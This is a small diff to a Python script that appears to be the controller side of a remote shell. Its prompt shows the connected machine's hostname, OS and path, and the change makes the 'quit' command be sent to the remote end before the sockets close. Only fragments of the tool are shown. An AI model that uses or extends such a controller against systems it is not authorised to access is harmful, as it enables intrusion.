@@ -1,4 +1,4 @@
-import socket, os, sys
+import socket, os, sys, time
 def createSocket():
 	try:
 		global host
@@ -54,6 +54,8 @@ def menu():
 		while cmd == "":
 			cmd = input(hostname + '(' + operatingSystem + ')@' + currentPath + '> ')
 		if cmd == 'quit':
+			conn.send(cmd.encode('utf8'))
+			time.sleep(5)
 			conn.close()
 			s.close()
 			sys.exit()
